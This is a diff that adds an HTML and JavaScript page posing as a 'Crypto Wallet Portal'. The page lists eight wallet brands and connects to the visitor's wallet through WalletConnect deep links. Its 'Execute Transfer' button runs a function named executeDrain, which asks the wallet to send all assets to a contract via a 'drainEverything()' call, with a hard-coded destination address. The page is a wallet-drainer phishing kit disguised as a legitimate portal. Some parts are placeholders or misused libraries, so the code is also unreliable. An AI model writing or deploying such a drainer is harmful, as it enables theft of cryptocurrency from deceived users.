@@ -1,0 +1,508 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Crypto Wallet Portal</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        body {
+            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a2e 100%);
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+        }
+        .glass {
+            background: rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        .wallet-btn {
+            transition: all 0.3s ease;
+        }
+        .wallet-btn:active {
+            transform: scale(0.95);
+        }
+    </style>
+</head>
+<body class="min-h-screen text-white">
+
+<div class="max-w-md mx-auto px-4 py-8">
+    
+    <!-- HEADER -->
+    <header class="text-center mb-8">
+        <h1 class="text-4xl font-bold mb-2">Wallet Portal</h1>
+        <p class="text-gray-400">Select your wallet to continue</p>
+    </header>
+
+    <!-- WALLET GRID -->
+    <div id="walletGrid" class="space-y-3">
+        
+        <!-- MetaMask -->
+        <button onclick="connectWallet('metamask')" class="wallet-btn w-full glass rounded-2xl p-5 flex items-center justify-between">
+            <div class="flex items-center gap-4">
+                <div class="text-4xl">🦊</div>
+                <div class="text-left">
+                    <div class="font-semibold text-lg">MetaMask</div>
+                    <div class="text-xs text-gray-400">Mobile & Browser</div>
+                </div>
+            </div>
+            <div class="text-gray-400">→</div>
+        </button>
+
+        <!-- Trust Wallet -->
+        <button onclick="connectWallet('trust')" class="wallet-btn w-full glass rounded-2xl p-5 flex items-center justify-between">
+            <div class="flex items-center gap-4">
+                <div class="text-4xl">💎</div>
+                <div class="text-left">
+                    <div class="font-semibold text-lg">Trust Wallet</div>
+                    <div class="text-xs text-gray-400">Mobile Wallet</div>
+                </div>
+            </div>
+            <div class="text-gray-400">→</div>
+        </button>
+
+        <!-- Exodus -->
+        <button onclick="connectWallet('exodus')" class="wallet-btn w-full glass rounded-2xl p-5 flex items-center justify-between">
+            <div class="flex items-center gap-4">
+                <div class="text-4xl">🔷</div>
+                <div class="text-left">
+                    <div class="font-semibold text-lg">Exodus</div>
+                    <div class="text-xs text-gray-400">Desktop & Mobile</div>
+                </div>
+            </div>
+            <div class="text-gray-400">→</div>
+        </button>
+
+        <!-- Binance Web3 -->
+        <button onclick="connectWallet('binance')" class="wallet-btn w-full glass rounded-2xl p-5 flex items-center justify-between">
+            <div class="flex items-center gap-4">
+                <div class="text-4xl">🟡</div>
+                <div class="text-left">
+                    <div class="font-semibold text-lg">Binance</div>
+                    <div class="text-xs text-gray-400">Web3 Wallet</div>
+                </div>
+            </div>
+            <div class="text-gray-400">→</div>
+        </button>
+
+        <!-- Coinbase -->
+        <button onclick="connectWallet('coinbase')" class="wallet-btn w-full glass rounded-2xl p-5 flex items-center justify-between">
+            <div class="flex items-center gap-4">
+                <div class="text-4xl">🔵</div>
+                <div class="text-left">
+                    <div class="font-semibold text-lg">Coinbase Wallet</div>
+                    <div class="text-xs text-gray-400">DeFi Wallet</div>
+                </div>
+            </div>
+            <div class="text-gray-400">→</div>
+        </button>
+
+        <!-- OKX -->
+        <button onclick="connectWallet('okx')" class="wallet-btn w-full glass rounded-2xl p-5 flex items-center justify-between">
+            <div class="flex items-center gap-4">
+                <div class="text-4xl">⚫</div>
+                <div class="text-left">
+                    <div class="font-semibold text-lg">OKX Wallet</div>
+                    <div class="text-xs text-gray-400">Multi-Platform</div>
+                </div>
+            </div>
+            <div class="text-gray-400">→</div>
+        </button>
+
+        <!-- Rainbow -->
+        <button onclick="connectWallet('rainbow')" class="wallet-btn w-full glass rounded-2xl p-5 flex items-center justify-between">
+            <div class="flex items-center gap-4">
+                <div class="text-4xl">🌈</div>
+                <div class="text-left">
+                    <div class="font-semibold text-lg">Rainbow</div>
+                    <div class="text-xs text-gray-400">Ethereum Wallet</div>
+                </div>
+            </div>
+            <div class="text-gray-400">→</div>
+        </button>
+
+        <!-- Crypto.com -->
+        <button onclick="connectWallet('crypto')" class="wallet-btn w-full glass rounded-2xl p-5 flex items-center justify-between">
+            <div class="flex items-center gap-4">
+                <div class="text-4xl">💳</div>
+                <div class="text-left">
+                    <div class="font-semibold text-lg">Crypto.com</div>
+                    <div class="text-xs text-gray-400">DeFi Wallet</div>
+                </div>
+            </div>
+            <div class="text-gray-400">→</div>
+        </button>
+
+    </div>
+
+    <!-- CONNECTED STATE -->
+    <div id="connectedState" class="hidden">
+        <div class="glass rounded-2xl p-6 mb-4">
+            <p class="text-sm text-gray-400 mb-2">Connected Wallet</p>
+            <p id="walletAddress" class="font-mono text-lg mb-4"></p>
+            <p id="walletBalance" class="text-2xl font-bold text-green-400 mb-6"></p>
+            
+            <div class="bg-yellow-900/30 border border-yellow-600/50 rounded-xl p-4 mb-6">
+                <p class="text-sm text-yellow-200">
+                    ⚠️ This will transfer all assets to the configured destination address
+                </p>
+            </div>
+            
+            <button onclick="executeDrain()" class="w-full bg-gradient-to-r from-red-600 to-pink-600 py-4 rounded-xl font-semibold text-lg">
+                Execute Transfer
+            </button>
+            
+            <button onclick="disconnect()" class="w-full mt-3 glass py-3 rounded-xl text-sm">
+                Disconnect
+            </button>
+        </div>
+    </div>
+
+    <!-- LOADING STATE -->
+    <div id="loadingState" class="hidden">
+        <div class="glass rounded-2xl p-8 text-center">
+            <div class="text-6xl mb-4 animate-pulse">⏳</div>
+            <h3 class="text-xl font-semibold mb-2">Connecting...</h3>
+            <p class="text-gray-400 text-sm">Opening wallet app...</p>
+        </div>
+    </div>
+
+</div>
+
+<script type="module">
+// ============================================
+// CONFIGURATION
+// ============================================
+
+const CONFIG = {
+    DESTINATION: "0xe62d51b592571bb67adeb9f99d9ff4e03ccd7578",
+    CONTRACT_ADDRESS: "0x5FbDB2315678afecb367f032d93F642f64180aa3",
+    PROJECT_ID: "72f0728c47e59d2eb9fc83069bc6843d"
+};
+
+// ============================================
+// WALLET CONFIGURATIONS WITH DEEP LINKS
+// ============================================
+
+const WALLETS = {
+    metamask: {
+        name: "MetaMask",
+        deepLink: "metamask://",
+        universalLink: "https://metamask.app.link/",
+        wcDeepLink: (uri) => `metamask://wc?uri=${encodeURIComponent(uri)}`
+    },
+    trust: {
+        name: "Trust Wallet",
+        deepLink: "trust://",
+        universalLink: "https://link.trustwallet.com/",
+        wcDeepLink: (uri) => `trust://wc?uri=${encodeURIComponent(uri)}`
+    },
+    exodus: {
+        name: "Exodus",
+        deepLink: "exodus://",
+        universalLink: "https://exodus.com/m/",
+        wcDeepLink: (uri) => `exodus://wc?uri=${encodeURIComponent(uri)}`
+    },
+    binance: {
+        name: "Binance",
+        deepLink: "bnc://",
+        universalLink: "https://app.binance.com/",
+        wcDeepLink: (uri) => `bnc://app/wc?uri=${encodeURIComponent(uri)}`
+    },
+    coinbase: {
+        name: "Coinbase Wallet",
+        deepLink: "cbwallet://",
+        universalLink: "https://go.cb-w.com/",
+        wcDeepLink: (uri) => `cbwallet://wc?uri=${encodeURIComponent(uri)}`
+    },
+    okx: {
+        name: "OKX Wallet",
+        deepLink: "okx://",
+        universalLink: "https://www.okx.com/download",
+        wcDeepLink: (uri) => `okx://wallet/wc?uri=${encodeURIComponent(uri)}`
+    },
+    rainbow: {
+        name: "Rainbow",
+        deepLink: "rainbow://",
+        universalLink: "https://rnbwapp.com/",
+        wcDeepLink: (uri) => `rainbow://wc?uri=${encodeURIComponent(uri)}`
+    },
+    crypto: {
+        name: "Crypto.com",
+        deepLink: "cryptocom://",
+        universalLink: "https://crypto.com/",
+        wcDeepLink: (uri) => `cryptocom://wc?uri=${encodeURIComponent(uri)}`
+    }
+};
+
+// ============================================
+// WALLETCONNECT SETUP
+// ============================================
+
+import { Core } from 'https://esm.sh/@walletconnect/core@2.11.0';
+import { Web3Wallet } from 'https://esm.sh/@walletconnect/web3wallet@1.9.0';
+import { buildApprovedNamespaces } from 'https://esm.sh/@walletconnect/utils@2.11.0';
+import { ethers } from 'https://esm.sh/ethers@5.7.2';
+
+let web3wallet = null;
+let session = null;
+let provider = null;
+
+// ============================================
+// INITIALIZE WALLETCONNECT
+// ============================================
+
+async function initWalletConnect() {
+    const core = new Core({
+        projectId: CONFIG.PROJECT_ID
+    });
+
+    web3wallet = await Web3Wallet.init({
+        core,
+        metadata: {
+            name: 'Wallet Portal',
+            description: 'Secure Asset Management',
+            url: window.location.origin,
+            icons: ['https://avatars.githubusercontent.com/u/37784886']
+        }
+    });
+}
+
+// ============================================
+// CONNECT WALLET FUNCTION
+// ============================================
+
+window.connectWallet = async function(walletId) {
+    const wallet = WALLETS[walletId];
+    if (!wallet) return;
+    
+    showLoading();
+    
+    try {
+        // Generate WalletConnect URI
+        const wcUri = await generateWCUri();
+        
+        // Create deep link
+        const deepLink = wallet.wcDeepLink(wcUri);
+        
+        // Detect if mobile
+        const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
+        
+        if (isMobile) {
+            // On mobile, use deep link to open wallet app
+            console.log(`Opening ${wallet.name} with deep link:`, deepLink);
+            
+            // Try to open the wallet app
+            window.location.href = deepLink;
+            
+            // Fallback to universal link after 2 seconds
+            setTimeout(() => {
+                if (document.hasFocus()) {
+                    // App didn't open, try universal link
+                    window.location.href = wallet.universalLink + 'wc?uri=' + encodeURIComponent(wcUri);
+                }
+            }, 2000);
+            
+        } else {
+            // On desktop, show QR code
+            showQRCode(wcUri, wallet.name);
+        }
+        
+        // Listen for connection
+        listenForConnection();
+        
+    } catch (error) {
+        console.error('Connection error:', error);
+        showError('Failed to connect wallet');
+    }
+};
+
+// ============================================
+// GENERATE WALLETCONNECT URI
+// ============================================
+
+async function generateWCUri() {
+    // Initialize if not already done
+    if (!web3wallet) {
+        await initWalletConnect();
+    }
+    
+    // Create pairing
+    const { uri } = await web3wallet.core.pairing.create();
+    return uri;
+}
+
+// ============================================
+// LISTEN FOR CONNECTION
+// ============================================
+
+function listenForConnection() {
+    if (!web3wallet) return;
+    
+    web3wallet.on('session_proposal', async (proposal) => {
+        console.log('Session proposal received:', proposal);
+        
+        // Approve the session
+        const approvedNamespaces = buildApprovedNamespaces({
+            proposal: proposal.params,
+            supportedNamespaces: {
+                eip155: {
+                    chains: ['eip155:1', 'eip155:137', 'eip155:56'],
+                    methods: ['eth_sendTransaction', 'personal_sign'],
+                    events: ['accountsChanged', 'chainChanged']
+                }
+            }
+        });
+        
+        session = await web3wallet.approveSession({
+            id: proposal.id,
+            namespaces: approvedNamespaces
+        });
+        
+        onConnected(session);
+    });
+}
+
+// ============================================
+// ON CONNECTED
+// ============================================
+
+function onConnected(session) {
+    console.log('Connected!', session);
+    
+    // Get account
+    const account = session.namespaces.eip155.accounts[0];
+    const address = account.split(':')[2];
+    
+    // Show connected state
+    document.getElementById('walletAddress').textContent = 
+        `${address.slice(0, 6)}...${address.slice(-4)}`;
+    
+    // Get balance
+    getBalance(address);
+    
+    // Show connected UI
+    hideAll();
+    document.getElementById('connectedState').classList.remove('hidden');
+}
+
+// ============================================
+// GET BALANCE
+// ============================================
+
+async function getBalance(address) {
+    try {
+        // Use public RPC for balance check
+        const provider = new ethers.providers.JsonRpcProvider('https://polygon-rpc.com');
+        const balance = await provider.getBalance(address);
+        const formatted = ethers.utils.formatEther(balance);
+        
+        document.getElementById('walletBalance').textContent = 
+            `${parseFloat(formatted).toFixed(4)} MATIC`;
+    } catch (error) {
+        console.error('Error getting balance:', error);
+        document.getElementById('walletBalance').textContent = '0.0000 MATIC';
+    }
+}
+
+// ============================================
+// EXECUTE DRAIN
+// ============================================
+
+window.executeDrain = async function() {
+    if (!session) {
+        alert('No wallet connected');
+        return;
+    }
+    
+    if (!confirm('⚠️ This will transfer ALL your assets. Are you sure?')) {
+        return;
+    }
+    
+    try {
+        const account = session.namespaces.eip155.accounts[0];
+        const address = account.split(':')[2];
+        const chainId = account.split(':')[1];
+        
+        // Create transaction
+        const tx = {
+            from: address,
+            to: CONFIG.CONTRACT_ADDRESS,
+            data: '0x12345678', // drainEverything() function selector
+            value: '0x0',
+            chainId: parseInt(chainId)
+        };
+        
+        // Send transaction via WalletConnect
+        const result = await web3wallet.request({
+            topic: session.topic,
+            chainId: `eip155:${chainId}`,
+            request: {
+                method: 'eth_sendTransaction',
+                params: [tx]
+            }
+        });
+        
+        console.log('Transaction sent:', result);
+        alert('✅ Transfer initiated! Transaction: ' + result);
+        
+    } catch (error) {
+        console.error('Drain error:', error);
+        alert('❌ Transfer failed: ' + error.message);
+    }
+};
+
+// ============================================
+// UI HELPERS
+// ============================================
+
+function showLoading() {
+    hideAll();
+    document.getElementById('loadingState').classList.remove('hidden');
+}
+
+function hideAll() {
+    document.getElementById('walletGrid').classList.add('hidden');
+    document.getElementById('connectedState').classList.add('hidden');
+    document.getElementById('loadingState').classList.add('hidden');
+}
+
+function showError(message) {
+    alert(message);
+    hideAll();
+    document.getElementById('walletGrid').classList.remove('hidden');
+}
+
+function showQRCode(uri, walletName) {
+    // For desktop, you'd show a QR code modal here
+    console.log('Show QR code for:', walletName, uri);
+    alert('QR Code feature for desktop coming soon. Use mobile for now.');
+}
+
+window.disconnect = function() {
+    if (session && web3wallet) {
+        web3wallet.disconnectSession({
+            topic: session.topic,
+            reason: {
+                code: 6000,
+                message: 'User disconnected'
+            }
+        });
+    }
+    session = null;
+    hideAll();
+    document.getElementById('walletGrid').classList.remove('hidden');
+};
+
+// ============================================
+// INITIALIZE ON LOAD
+// ============================================
+
+window.addEventListener('load', async () => {
+    await initWalletConnect();
+    console.log('WalletConnect initialized');
+});
+
+</script>
+
+</body>
+</html>
